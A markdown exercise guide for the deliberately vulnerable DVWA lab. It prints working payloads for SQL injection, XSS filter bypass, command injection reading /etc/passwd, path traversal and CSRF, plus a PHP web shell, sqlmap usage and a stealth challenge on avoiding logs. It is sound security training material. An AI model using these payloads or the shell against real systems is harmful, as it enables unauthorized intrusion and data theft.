# 🎯 DVWA (Damn Vulnerable Web Application) - Practice Exercises

## Overview

DVWA is an intentionally vulnerable web application designed to help security professionals learn and practice web application security testing. This guide provides structured exercises progressing from basic to advanced techniques.

## 🚀 Quick Setup

### Docker Installation (Recommended)
```bash
# Pull and run DVWA
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# Access at: http://localhost
# Default credentials: admin / password
```

### Manual Setup
1. Download from: http://www.dvwa.co.uk/
2. Extract to web server directory (XAMPP, WAMP, etc.)
3. Configure database settings in `config/config.inc.php`
4. Access via web browser

## 🎚️ Security Levels

DVWA has four security levels that progressively increase difficulty:

- **Low**: Basic vulnerabilities with minimal protection
- **Medium**: Some input validation and basic filtering  
- **High**: Better validation but still bypassable
- **Impossible**: Secure implementation (reference for fixes)

**Start with Low security and progress upward as you master each vulnerability.**

## 📚 Exercise Modules

### 1. 🔍 SQL Injection

**Learning Objectives:**
- Identify SQL injection points
- Extract database information
- Bypass authentication
- Understand different injection types

#### Low Security Exercises

**Exercise 1.1: Basic Detection**
```
1. Navigate to SQL Injection module
2. Enter single quote (') in User ID field
3. Observe error message revealing database structure
4. Try: 1' OR '1'='1
5. Document what information is revealed
```

**Exercise 1.2: Data Extraction**
```sql
-- Find number of columns
1' ORDER BY 1-- 
1' ORDER BY 2-- 
1' ORDER BY 3-- (continue until error)

-- Extract database information
1' UNION SELECT 1,database()-- 
1' UNION SELECT 1,version()-- 
1' UNION SELECT 1,user()-- 

-- List tables
1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- 

-- Extract user data
1' UNION SELECT user,password FROM users-- 
```

#### Medium Security Challenges
- Bypass numeric input validation
- Use different injection techniques
- Handle filtered characters

#### High Security Advanced
- Session-based injection
- Blind SQL injection techniques
- Time-based injection

**📝 Documentation Template:**
```
Vulnerability: SQL Injection
Location: [URL/Parameter]
Payload: [Injection string used]
Impact: [Data extracted/damage possible]
Remediation: [Prepared statements, input validation]
```

### 2. 🚨 Cross-Site Scripting (XSS)

**Learning Objectives:**
- Identify XSS vulnerabilities
- Create effective payloads
- Understand different XSS types
- Practice filter bypass techniques

#### Reflected XSS Exercises

**Exercise 2.1: Basic Reflected XSS**
```javascript
// Test for XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Exercise 2.2: Filter Bypass (Medium/High)**
```javascript
// Bypass script tag filtering
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>

// Use events
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>

// Bypass keyword filtering
<img src=x onerror=eval('al'+'ert(1)')>
<script>window['alert'](1)</script>
```

#### Stored XSS Exercises

**Exercise 2.3: Persistent XSS**
```
1. Navigate to XSS Stored module
2. Enter malicious payload in message field
3. Verify payload executes for all users
4. Test different payload variations
```

### 3. 🔐 Brute Force Attacks

**Learning Objectives:**
- Understand authentication weaknesses
- Practice password attacks
- Learn timing attacks
- Implement rate limiting bypasses

**Exercise 3.1: Manual Brute Force**
```
1. Navigate to Brute Force module
2. Try common passwords: admin, password, 123456
3. Observe response differences
4. Note timing differences
```

**Exercise 3.2: Automated Attack with Burp Suite**
```
1. Intercept login request in Burp Suite
2. Send to Intruder
3. Configure payload positions
4. Load common passwords wordlist
5. Start attack and analyze results
```

**Burp Suite Intruder Setup:**
- Position markers: §username§ and §password§
- Attack type: Cluster bomb
- Payloads: Load rockyou.txt or common passwords
- Grep: Look for "Welcome" vs "Username and/or password incorrect"

### 4. 🗂️ File Upload Vulnerabilities

**Learning Objectives:**
- Bypass file type restrictions
- Upload malicious files
- Achieve code execution
- Understand upload security

**Exercise 4.1: Bypass File Type Validation**
```php
// Create PHP shell
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

// Save as shell.php.gif (double extension)
// Or shell.gif with PHP code
```

**Exercise 4.2: Content-Type Bypass**
```
1. Upload legitimate image first
2. Intercept with Burp Suite
3. Replace image content with PHP shell
4. Modify Content-Type to image/gif
5. Forward request
```

### 5. 🚪 Command Injection

**Learning Objectives:**
- Identify command injection points
- Chain commands effectively
- Extract system information
- Understand OS command differences

**Exercise 5.1: Basic Command Injection**
```bash
# Test injection characters
127.0.0.1; ls
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `id`

# Windows equivalents
127.0.0.1 & dir
127.0.0.1 && whoami
127.0.0.1 | type c:\windows\system32\drivers\etc\hosts
```

### 6. 🔓 Insecure Direct Object References (IDOR)

**Learning Objectives:**
- Identify reference parameters
- Access unauthorized data
- Understand access control flaws
- Practice parameter manipulation

**Exercise 6.1: File Access IDOR**
```
1. Navigate to File Inclusion module
2. Observe file parameter in URL
3. Try accessing: ../../../../etc/passwd
4. Test different file paths
5. Document accessible files
```

### 7. 🛡️ Cross-Site Request Forgery (CSRF)

**Learning Objectives:**
- Understand CSRF attack vectors
- Create malicious forms
- Bypass basic protections
- Implement proper defenses

**Exercise 7.1: Basic CSRF Attack**
```html
<!-- Create malicious HTML file -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
    <form id="csrf-form" action="http://localhost/vulnerabilities/csrf/" method="POST">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
    </form>
</body>
</html>
```

## 🔧 Tools and Setup

### Essential Tools

1. **Burp Suite Community**
   - Proxy: 127.0.0.1:8080
   - Enable intercept
   - Configure browser proxy

2. **Browser Extensions**
   - FoxyProxy (Firefox/Chrome)
   - Wappalyzer
   - Developer Tools

3. **Command Line Tools**
   ```bash
   # SQLMap for SQL injection
   sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=your_session_id"
   
   # Dirb for directory enumeration
   dirb http://localhost/
   
   # Nikto for vulnerability scanning
   nikto -h http://localhost/
   ```

### Burp Suite Configuration

**Proxy Settings:**
1. Proxy > Options > Proxy Listeners
2. Add: 127.0.0.1:8080
3. Configure browser to use proxy
4. Import Burp CA certificate

**Useful Extensions:**
- Logger++
- Autorize
- SQLi Scanner
- XSS Validator

## 📊 Progress Tracking

### Beginner Checklist (Low Security)
- [ ] Basic SQL injection with UNION
- [ ] Reflected XSS with alert()
- [ ] Manual brute force attack
- [ ] File upload bypass with double extension
- [ ] Command injection with semicolon
- [ ] IDOR with directory traversal
- [ ] Basic CSRF attack

### Intermediate Checklist (Medium Security)
- [ ] Blind SQL injection
- [ ] XSS filter bypass techniques
- [ ] Automated brute force with Burp
- [ ] Advanced file upload bypasses
- [ ] Command injection with multiple separators
- [ ] IDOR parameter manipulation
- [ ] CSRF token analysis

### Advanced Checklist (High Security)
- [ ] Time-based SQL injection
- [ ] DOM-based XSS
- [ ] Rate limiting bypass
- [ ] File upload with magic bytes
- [ ] Blind command injection
- [ ] Complex IDOR chains
- [ ] CSRF protection bypass

## 📝 Reporting Practice

For each vulnerability found, document:

**Vulnerability Report Template:**
```markdown
## [Vulnerability Name]

**Severity:** Critical/High/Medium/Low
**Location:** [URL/Parameter]
**Description:** [What the vulnerability allows]

### Steps to Reproduce:
1. Navigate to [URL]
2. Enter payload: [payload]
3. Observe result: [what happens]

### Impact:
- [What an attacker could achieve]
- [Business impact]

### Remediation:
- [Specific fix recommendations]
- [Code examples if possible]

### Screenshots:
[Include Burp Suite requests/responses]
```

## 🎯 Lab Challenges

### Challenge 1: The Full Chain
**Objective:** Combine multiple vulnerabilities
1. Use SQL injection to extract admin credentials
2. Login as admin
3. Upload PHP shell via file upload
4. Use shell to read sensitive files
5. Document complete attack chain

### Challenge 2: Bypass Everything
**Objective:** Exploit high security level
1. Set DVWA to high security
2. Find ways to bypass all protections
3. Achieve same results as low security
4. Document bypass techniques used

### Challenge 3: Stealth Testing
**Objective:** Avoid detection
1. Test all modules without triggering obvious alerts
2. Use time delays and subtle techniques
3. Minimize logs and traces
4. Practice real-world methodology

## 🔄 Reset and Cleanup

### Reset DVWA Database
```bash
# Access DVWA setup page
http://localhost/setup.php

# Click "Create/Reset Database"
# This restores default state
```

### Docker Cleanup
```bash
# Stop container
docker stop dvwa

# Remove container
docker rm dvwa

# Remove image (optional)
docker rmi vulnerables/web-dvwa
```

## 🎓 Next Steps

After mastering DVWA:

1. **[OWASP Juice Shop](juice-shop.md)** - Modern application challenges
2. **[PortSwigger Academy](portswigger.md)** - Advanced professional labs
3. **[WebGoat](webgoat.md)** - Interactive guided lessons
4. **Bug Bounty Programs** - Real-world practice

## ⚠️ Important Reminders

- **NEVER** deploy DVWA on public networks
- **ALWAYS** use isolated environments
- **NEVER** test techniques on unauthorized systems
- **ALWAYS** follow responsible disclosure
- **PRACTICE** only in legal, authorized environments

## 📚 Additional Resources

- **DVWA Official**: http://www.dvwa.co.uk/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **Burp Suite Documentation**: https://portswigger.net/burp/documentation
- **SQL Injection Cheatsheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet

---

**Ready to start?** Set security to Low and begin with SQL Injection exercises. Remember: the goal is understanding, not just exploitation!

Happy (ethical) hacking! 🎯
